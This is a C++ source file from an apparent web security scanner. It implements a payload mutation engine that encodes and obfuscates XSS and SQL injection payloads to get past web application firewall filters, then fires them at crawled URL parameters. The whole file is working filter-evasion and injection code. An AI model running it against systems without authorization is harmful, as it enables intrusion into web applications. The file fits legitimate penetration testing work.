/// @file scanners/payload_mutator.cpp
/// @brief Adaptive Payload Mutation Engine: when a payload is blocked,
///        automatically mutates it using encoding, case variation, chunking,
///        comment insertion, and double-encoding until it bypasses.
///        Essentially brute-forces the WAF's regex rules.
#include <random>
#include <regex>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// Encoding mutations.
std::string url_encode(const std::string& s) {
  std::string out;
  for (char c : s) {
    if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
      out += c;
    } else {
      char hex[4];
      snprintf(hex, sizeof(hex), "%%%02X", (unsigned char)c);
      out += hex;
    }
  }
  return out;
}

std::string double_url_encode(const std::string& s) { return url_encode(url_encode(s)); }

std::string unicode_encode(const std::string& s) {
  std::string out;
  for (char c : s) {
    if (isalpha(c)) {
      char buf[8];
      snprintf(buf, sizeof(buf), "%%u00%02X", (unsigned char)c);
      out += buf;
    } else {
      out += c;
    }
  }
  return out;
}

std::string random_case(const std::string& s) {
  static std::mt19937 rng(42);
  std::string out = s;
  for (auto& c : out) {
    if (isalpha(c)) c = (rng() % 2) ? toupper(c) : tolower(c);
  }
  return out;
}

std::string insert_comments(const std::string& s) {
  // Insert SQL comments between keywords
  std::string out;
  for (size_t i = 0; i < s.size(); i++) {
    out += s[i];
    if (i > 0 && i < s.size() - 1 && isalpha(s[i]) && isalpha(s[i + 1]) && (rand() % 3 == 0)) {
      out += "/**/";
    }
  }
  return out;
}

std::string null_byte_insert(const std::string& s) {
  std::string out;
  for (char c : s) {
    out += c;
    if (isalpha(c) && (rand() % 4 == 0)) out += "%00";
  }
  return out;
}

std::string tab_substitute(const std::string& s) {
  std::string out = s;
  size_t pos;
  while ((pos = out.find(' ')) != std::string::npos) {
    out.replace(pos, 1, "%09");
  }
  return out;
}

std::string newline_substitute(const std::string& s) {
  std::string out = s;
  size_t pos;
  while ((pos = out.find(' ')) != std::string::npos) {
    out.replace(pos, 1, "%0a");
  }
  return out;
}

/// Generate all mutations of a payload.
std::vector<std::string> mutate_payload(const std::string& payload) {
  std::vector<std::string> mutations;
  mutations.push_back(payload);
  mutations.push_back(url_encode(payload));
  mutations.push_back(double_url_encode(payload));
  mutations.push_back(unicode_encode(payload));
  mutations.push_back(random_case(payload));
  mutations.push_back(insert_comments(payload));
  mutations.push_back(null_byte_insert(payload));
  mutations.push_back(tab_substitute(payload));
  mutations.push_back(newline_substitute(payload));

  // Combine: random case + comments
  mutations.push_back(insert_comments(random_case(payload)));
  // Combine: url encode + random case
  mutations.push_back(url_encode(random_case(payload)));
  // Combine: tab + comments
  mutations.push_back(tab_substitute(insert_comments(payload)));

  return mutations;
}

/// Run mutation engine on reflective parameters.
std::vector<Finding> scan_mutate_xss(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  std::vector<std::string> base_payloads = {
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
  };

  for (const auto& url : crawl.urls) {
    auto qpos = url.find('?');
    if (qpos == std::string::npos) continue;

    std::regex param_re(R"x(([^&=]+)=([^&]*))x");
    std::string query = url.substr(qpos + 1);
    std::sregex_iterator it(query.begin(), query.end(), param_re);
    std::sregex_iterator end;

    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string inject_url = url.substr(0, qpos + 1) + param + "=";

      // Check reflection
      std::string canary = "apexcanary999";
      auto check = http.get(inject_url + canary);
      if (check.body.find(canary) == std::string::npos) continue;

      // Mutate and test
      for (const auto& base_payload : base_payloads) {
        auto mutations = mutate_payload(base_payload);
        for (const auto& mut : mutations) {
          auto resp = http.get(inject_url + mut);
          if (resp.status_code == 200) {
            // Check if the decoded payload appears in response
            if (resp.body.find("alert(1)") != std::string::npos || resp.body.find("onerror=") != std::string::npos ||
                resp.body.find("onload=") != std::string::npos || resp.body.find("<script>") != std::string::npos) {
              findings.push_back(Finding{"XSS — Mutation Bypass", "critical", inject_url + mut,
                                         "XSS confirmed via payload mutation engine. "
                                         "Original payload was blocked, but mutation bypassed filter: " +
                                             mut,
                                         param, mut, ""});
              return findings;
            }
          }
        }
      }
      return findings;  // Only test first reflecting param
    }
    break;
  }
  return findings;
}

/// Run mutation engine on numeric parameters for SQLi.
std::vector<Finding> scan_mutate_sqli(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::vector<std::string> base_payloads = {
      "' OR 1=1--",
      "' UNION SELECT NULL--",
      "'; WAITFOR DELAY '0:0:5'--",
  };

  for (const auto& url : crawl.urls) {
    auto qpos = url.find('?');
    if (qpos == std::string::npos) continue;

    std::regex num_re(R"x(([^&=]+)=(\d+))x");
    std::string query = url.substr(qpos + 1);
    std::sregex_iterator it(query.begin(), query.end(), num_re);
    std::sregex_iterator end;

    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string orig = (*it)[2].str();
      std::string inject_url = url.substr(0, qpos + 1) + param + "=" + orig;

      auto baseline = http.get(inject_url);

      for (const auto& bp : base_payloads) {
        auto mutations = mutate_payload(bp);
        for (const auto& mut : mutations) {
          auto resp = http.get(inject_url + mut);
          if (resp.status_code == 200 && (resp.body.find("SQL") != std::string::npos || resp.body.find("mysql") != std::string::npos ||
                                          resp.body.find("syntax") != std::string::npos || resp.body.find("ORA-") != std::string::npos)) {
            findings.push_back(Finding{"SQLi — Mutation Bypass", "critical", inject_url + mut,
                                       "SQL injection confirmed via mutation engine. "
                                       "Mutation that bypassed: " +
                                           mut,
                                       param, mut, resp.body.substr(0, 200)});
            return findings;
          }
        }
      }
      return findings;
    }
    break;
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_payload_mutator_scanners() {
  return {
      {"Mutation XSS", scan_mutate_xss},
      {"Mutation SQLi", scan_mutate_sqli},
  };
}

}  // namespace apex
